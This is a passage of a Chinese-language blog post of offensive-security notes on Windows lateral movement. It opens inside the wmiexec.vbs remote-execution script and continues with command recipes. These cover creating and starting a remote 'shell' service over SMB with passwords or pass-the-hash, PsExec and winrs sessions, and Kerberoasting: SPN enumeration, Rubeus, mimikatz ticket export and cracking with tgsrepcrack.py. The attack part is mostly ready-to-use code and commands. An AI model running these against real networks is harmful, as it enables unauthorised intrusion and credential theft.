ERROR: Share Name Already In Used!&quot;</span></span><br><span class="line">            <span class="keyword">Case</span> <span class="number">24</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Directory NOT exists!&quot;</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line">        <span class="keyword">If</span> intReturn &lt;&gt; <span class="number">22</span> <span class="keyword">Then</span> WScript.Quit</span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC : Share created sucess.&quot;</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC : Share Name -&gt; WMI_SHARE&quot;</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC : Share Path -&gt; &quot;</span> &amp; FilePath</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> DeleteShare()</span><br><span class="line">    <span class="keyword">Set</span> colShares = objWMIService.ExecQuery _</span><br><span class="line">        (<span class="string">&quot;Select * from Win32_Share Where Name = &#x27;WMI_SHARE&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">For</span> <span class="keyword">Each</span> objShare <span class="keyword">In</span> colShares</span><br><span class="line">        intReturn = objShare.Delete</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Delete Share failed.&quot;</span> &amp; _</span><br><span class="line">            vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">        <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">            <span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">            <span class="keyword">Case</span> <span class="number">25</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share Not Exists!&quot;</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC : Share deleted sucess.&quot;</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Exec(cmd, file)</span><br><span class="line">    <span class="keyword">Set</span> objStartup = objWMIService.<span class="keyword">Get</span>(<span class="string">&quot;Win32_ProcessStartup&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</span><br><span class="line">    objConfig.ShowWindow = <span class="number">12</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Set</span> objProcess=objWMIService.<span class="keyword">get</span>(<span class="string">&quot;Win32_Process&quot;</span>)</span><br><span class="line">    strExec = <span class="string">&quot;cmd.exe /c &quot;</span> &amp; cmd &amp; <span class="string">&quot; &gt; &quot;</span> &amp; file &amp; <span class="string">&quot; 2&gt;&amp;1&quot;</span>  <span class="comment">&#x27;2&gt;&amp;1 err</span></span><br><span class="line">    <span class="keyword">If</span> boolPersist <span class="keyword">Then</span></span><br><span class="line">        strExec = cmd</span><br><span class="line">        intPath = <span class="built_in">InStr</span>(cmd,<span class="string">&quot;\&quot;</span>)</span><br><span class="line">        <span class="keyword">If</span> intPath = <span class="number">0</span> <span class="keyword">Then</span> strExec = CurrentFolder &amp; <span class="string">&quot;\&quot;</span> &amp; strExec</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="comment">&#x27;WScript.Echo strExec</span></span><br><span class="line">    intReturn = objProcess.Create _</span><br><span class="line">        (strExec, CurrentFolder, objConfig, intProcessID)  <span class="comment">&#x27;Add CurrentFolder (strExec, Null, objConfig, intProcessID)</span></span><br><span class="line">    <span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">        WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Process could not be created.&quot;</span> &amp; _</span><br><span class="line">            vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Command -&gt; &quot;</span> &amp; cmd &amp; _</span><br><span class="line">            vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">        <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">            <span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">            <span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Insufficient Privilege!&quot;</span></span><br><span class="line">            <span class="keyword">Case</span> <span class="number">9</span></span><br><span class="line">                WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Path Not Found!&quot;</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line">    <span class="keyword">Else</span></span><br><span class="line"><span class="comment">&#x27;        WScript.Echo &quot;Process created.&quot; &amp; _</span></span><br><span class="line"><span class="comment">&#x27;            vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _</span></span><br><span class="line"><span class="comment">&#x27;            vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID</span></span><br><span class="line">        <span class="keyword">If</span> boolPersist <span class="keyword">Then</span> WScript.Echo <span class="string">&quot;WMIEXEC : Process created. PID: &quot;</span>&amp; intProcessID</span><br><span class="line">        <span class="keyword">If</span> boolGetFolder = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">            boolGetFolder = <span class="literal">False</span></span><br><span class="line">            Exec = GetCurrentFolder()</span><br><span class="line">            <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">        <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">        <span class="comment">&#x27;ReadResult()</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> ReadResult()</span><br><span class="line">    WScript.Sleep(WAITTIME)</span><br><span class="line">    UNCFilePath = <span class="string">&quot;\\&quot;</span> &amp; host &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="string">&quot;WMI_SHARE&quot;</span> &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">    <span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> objFile = fso.OpenTextFile(UNCFilePath, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">If</span> <span class="keyword">Not</span> objFile.AtEndOfStream <span class="keyword">Then</span> strContents = objFile.ReadAll</span><br><span class="line">    objFile.Close</span><br><span class="line">    WScript.Echo strContents</span><br><span class="line">    <span class="comment">&#x27;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder</span></span><br><span class="line">    strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">    Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> GetCurrentFolder()</span><br><span class="line">    WScript.Sleep(WAITTIME)</span><br><span class="line">    UNCFilePath = <span class="string">&quot;\\&quot;</span> &amp; host &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="string">&quot;WMI_SHARE&quot;</span> &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line">    <span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> objFile = fso.OpenTextFile(UNCFilePath, <span class="number">1</span>)</span><br><span class="line">    GetCurrentFolder = objFile.ReadLine</span><br><span class="line">    objFile.Close</span><br><span class="line">    strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">    Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript //nologo wmiexec.vbs /shell &lt;ip&gt; &lt;password&gt; &lt;password&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="SMB横向移动"><a href="#SMB横向移动" class="headerlink" title="SMB横向移动"></a>SMB横向移动</h2><h3 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h3><ul>
+<li>Windows内置工具</li>
+<li>无回显，不能交互</li>
+</ul>
+<h4 id="创建服务"><a href="#创建服务" class="headerlink" title="创建服务"></a>创建服务</h4><h5 id="明文连接"><a href="#明文连接" class="headerlink" title="明文连接"></a>明文连接</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services ./&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; create -name shell -display shellexec -<span class="built_in">path</span> C:\Windows\System32\shell.exe</span><br></pre></td></tr></table></figure>
+
+<h5 id="密文连接"><a href="#密文连接" class="headerlink" title="密文连接"></a>密文连接</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services -hashes :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ./&lt;username&gt;@&lt;ip&gt; create -name shell -display shellexec -<span class="built_in">path</span> C:\Windows\System32\shell.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="运行服务"><a href="#运行服务" class="headerlink" title="运行服务"></a>运行服务</h4><h5 id="明文连接-1"><a href="#明文连接-1" class="headerlink" title="明文连接"></a>明文连接</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services ./&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; <span class="built_in">start</span> -name shell</span><br></pre></td></tr></table></figure>
+
+<h5 id="密文连接-1"><a href="#密文连接-1" class="headerlink" title="密文连接"></a>密文连接</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services -hashes :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx ./&lt;username&gt;@&lt;ip&gt; <span class="built_in">start</span> -name shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><ul>
+<li>Microsoft官方工具</li>
+<li>有回显，可以交互</li>
+</ul>
+<h4 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h4><ul>
+<li><a href="/302.html?target=https://learn.microsoft.com/zh-cn/sysinternals/downloads/pstools">微软官方PSTools工具包下载页面</a></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f https://download.sysinternals.com/files/PSTools.zip</span><br><span class="line">&quot;C:\Program Files\<span class="number">7</span>-Zip\<span class="number">7</span>z.exe&quot; x PSTools.zip -oPSTools</span><br><span class="line"><span class="built_in">cd</span> PSTools</span><br></pre></td></tr></table></figure>
+
+<h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\PsExec64.exe \\&lt;ip&gt; -u &lt;username&gt; -p &lt;password&gt; -s <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="RDP横向移动"><a href="#RDP横向移动" class="headerlink" title="RDP横向移动"></a>RDP横向移动</h2><ul>
+<li>连接与被连接双方必须都开启WinRM服务（Windows远程管理服务），端口号为5985<ul>
+<li>Windows7以上默认开启</li>
+<li>Windows7及以下默认关闭</li>
+</ul>
+</li>
+</ul>
+<h3 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:&lt;ip&gt; -u:&lt;username&gt; -p:&lt;password&gt; &lt;<span class="built_in">cmd</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:&lt;ip&gt; -u:&lt;domain&gt;\&lt;username&gt; -p:&lt;password&gt; &lt;<span class="built_in">cmd</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberos横向移动"><a href="#Kerberos横向移动" class="headerlink" title="Kerberos横向移动"></a>Kerberos横向移动</h2><ul>
+<li>利用Windows服务通讯提取凭据</li>
+<li>暴力破解采用RC4加密的凭据的密码</li>
+</ul>
+<h3 id="寻找目标"><a href="#寻找目标" class="headerlink" title="寻找目标"></a>寻找目标</h3><ul>
+<li>凭据采用RC4加密</li>
+</ul>
+<h4 id="通过PowerShell寻找目标"><a href="#通过PowerShell寻找目标" class="headerlink" title="通过PowerShell寻找目标"></a>通过PowerShell寻找目标</h4><ul>
+<li>手动一个一个查找采用RC4加密的凭据的Windows服务</li>
+</ul>
+<h5 id="查看域内主机启用的Windows服务"><a href="#查看域内主机启用的Windows服务" class="headerlink" title="查看域内主机启用的Windows服务"></a>查看域内主机启用的Windows服务</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-T</span> &lt;domain&gt; <span class="literal">-q</span> */*</span><br></pre></td></tr></table></figure>
+
+<h6 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h6><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T &lt;domain&gt; -q */* | <span class="built_in">findstr</span> &quot;&lt;str&gt;&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h5><blockquote>
+<p><code>MSSQLSvc/Srv-DB-&lt;domain&gt;:1433</code>：上一步骤得到的服务全名</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-Type</span> <span class="literal">-AssemblyName</span> System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken <span class="literal">-ArgumentList</span> <span class="string">&quot;MSSQLSvc/Srv-DB-&lt;domain&gt;:1433&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="查看凭据"><a href="#查看凭据" class="headerlink" title="查看凭据"></a>查看凭据</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过Rubeus"><a href="#通过Rubeus" class="headerlink" title="通过Rubeus"></a>通过Rubeus</h4><ul>
+<li>直接得到采用RC4加密的凭据的Windows服务</li>
+</ul>
+<h5 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f https://github.com/GhostPack/Rubeus/archive/refs/tags/<span class="number">1</span>.<span class="number">6</span>.<span class="number">4</span>.zip</span><br><span class="line">&quot;C:\Program Files\<span class="number">7</span>-Zip\<span class="number">7</span>z.exe&quot; x <span class="number">1</span>.<span class="number">6</span>.<span class="number">4</span>.zip</span><br></pre></td></tr></table></figure>
+
+<h5 id="通过VisualStudio编译源码"><a href="#通过VisualStudio编译源码" class="headerlink" title="通过VisualStudio编译源码"></a>通过VisualStudio编译源码</h5><ul>
+<li>通过VisualStudio打开<code>Rubeus-1.6.4/Rubeus.sln</code>文件，编译项目</li>
+</ul>
+<p><img src="/images/20241112152147/01.webp"></p>
+<ul>
+<li>生成<code>Rubeus-1.6.4/Rubeus/bin/Debug/Rubeus.exe</code>文件</li>
+</ul>
+<h5 id="判断凭据的加密协议为RC4的目标"><a href="#判断凭据的加密协议为RC4的目标" class="headerlink" title="判断凭据的加密协议为RC4的目标"></a>判断凭据的加密协议为RC4的目标</h5><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgt kerberoast</span><br></pre></td></tr></table></figure>
+
+<h5 id="查看凭据-1"><a href="#查看凭据-1" class="headerlink" title="查看凭据"></a>查看凭据</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
+
+<h3 id="通过mimikatz导出凭据"><a href="#通过mimikatz导出凭据" class="headerlink" title="通过mimikatz导出凭据"></a>通过mimikatz导出凭据</h3><ul>
+<li><a href="/2024/11/14/mimikatz%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE-1">传送门</a></li>
+</ul>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+
+<h3 id="暴力破解凭据"><a href="#暴力破解凭据" class="headerlink" title="暴力破解凭据"></a>暴力破解凭据</h3><h4 id="下载依赖-1"><a href="#下载依赖-1" class="headerlink" title="下载依赖"></a>下载依赖</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nidem/kerberoast.git</span><br><span class="line"><span class="built_in">cd</span> kerberoast</span><br></pre></td></tr></table></figure>
+
+<h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><blockquote>
+<p><code>&lt;file&gt;.txt</code>：字典文件<br><code>&lt;file_ticket&gt;</code>：上一步骤导出的凭据文件</p>
+</blockquote>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tgsrepcrack.py &lt;file&gt;.txt &lt;file_ticket&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/246440.html">freebuf——Anonymous_124</a><br><a target="_blank" rel="noopener" href="https://www.ixigua.com/6915743234513863182">西瓜视频——爱比较</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/jataflf/article/details/52788280">CSDN——jataflf</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div><svg class="coin" width="28" height="28" viewBox="0 0 28 28" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M14.045 25.5454C7.69377 25.5454 2.54504 20.3967 2.54504 14.0454C2.54504 7.69413 7.69377 2.54541 14.045 2.54541C20.3963 2.54541 25.545 7.69413 25.545 14.0454C25.545 17.0954 24.3334 20.0205 22.1768 22.1771C20.0201 24.3338 17.095 25.5454 14.045 25.5454ZM9.66202 6.81624H18.2761C18.825 6.81624 19.27 7.22183 19.27 7.72216C19.27 8.22248 18.825 8.62807 18.2761 8.62807H14.95V10.2903C17.989 10.4444 20.3766 12.9487 20.3855 15.9916V17.1995C20.3854 17.6997 19.9799 18.1052 19.4796 18.1052C18.9793 18.1052 18.5738 17.6997 18.5737 17.1995V15.9916C18.5667 13.9478 16.9882 12.2535 14.95 12.1022V20.5574C14.95 21.0577 14.5444 21.4633 14.0441 21.4633C13.5437 21.4633 13.1382 21.0577 13.1382 20.5574V12.1022C11.1 12.2535 9.52148 13.9478 9.51448 15.9916V17.1995C9.5144 17.6997 9.10883 18.1052 8.60856 18.1052C8.1083 18.1052 7.70273 17.6997 7.70265 17.1995V15.9916C7.71158 12.9487 10.0992 10.4444 13.1382 10.2903V8.62807H9.66202C9.11309 8.62807 8.66809 8.22248 8.66809 7.72216C8.66809 7.22183 9.11309 6.81624 9.66202 6.81624Z" fill="currentColor"></path></svg></div>
+  <button>
+    储钱罐
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/assets/images/reward/images/wxpay.png" alt="57uv6Z6g 微信支付">
+        <span>微信支付</span>
+      </div>
+      <div>
+        <img src="/assets/images/reward/images/alipay.png" alt="57uv6Z6g 支付宝">
+        <span>支付宝</span>
+      </div>
+      <div>
+        <img src="/assets/images/reward/images/qqpay.png" alt="57uv6Z6g qqpay">
+        <span>qqpay</span>
+      </div>
+      <div>
+        <img src="/assets/images/reward/images/bitcoin.png" alt="57uv6Z6g 比特币">
+        <span>比特币</span>
+      </div>
+      <div>
+        <img src="/assets/images/reward/images/ethereum.png" alt="57uv6Z6g ethereum">
+        <span>ethereum</span>
+      </div>
+      <div>
+        <img src="/assets/images/reward/images/monero.png" alt="57uv6Z6g monero">
+        <span>monero</span>
+      </div>
+      <div>
+        <img src="/assets/images/reward/images/paypal.png" alt="57uv6Z6g 贝宝">
+        <span>贝宝</span>
+      </div>
+
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Github/" rel="tag"># Github</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/11/11/CobaltStrike%E5%88%9B%E5%BB%BASocks%E4%BB%A3%E7%90%86/" rel="prev" title="【笔记】CobaltStrike创建Socks代理">
+                  <i class="fa fa-angle-left"></i> 【笔记】CobaltStrike创建Socks代理
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/11/12/%E9%80%9A%E8%BF%87Docker%E9%83%A8%E7%BD%B21Panel/" rel="next" title="【笔记】通过Docker部署1Panel">
+                  【笔记】通过Docker部署1Panel <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments"><div id="twikoo-comments"></div></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">57uv6Z6g</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+<div id="site-time"></div>
+
+
+<div id="current-visitors-count"></div>
+
+
+<div id="site-badge"></div>
+
+
+<div id="loading-door-left"></div>
+<div id="loading-door-right"></div>
+<a id="loading-door-a" href="javascript:loadingDoorOpen();">芝麻开门</a>
+
+
+<div id="waifu">
+  <div id="waifu-tips"></div>
+  <canvas id="live2d" width="800" height="800"></canvas>
+</div>
+<div id="waifu-toggle">
+  <span>看板娘</span>
+</div>
+
+
+<link rel="stylesheet" href="/dist/bundle.css">
+
+
+<script src="/dist/bundle.js"></script>
+
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+<script class="next-config" data-name="twikoo" type="application/json">{"enable":true,"visitor":false,"envId":"https://twikoo.loli.fj.cn","jsUrl":"https://unpkg.com/twikoo@1.6.44/dist/twikoo.min.js","el":"#twikoo-comments"}</script>
+<script>
+document.addEventListener('page:loaded', () => {
+  NexT.utils.loadComments(CONFIG.twikoo.el)
+    .then(() => NexT.utils.getScript(
+      CONFIG.twikoo.jsUrl || 'https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js',
+      { condition: window.twikoo }
+    ))
+    .then(() => {
+      twikoo.init(CONFIG.twikoo);
+    });
+});
+</script>
+<style>
+.post-block, .comments {
+  overflow: visible;
+}
+.tk-owo-emotion {
+  display: inline-block;
+}
+</style>
+
+</body>
+</html>
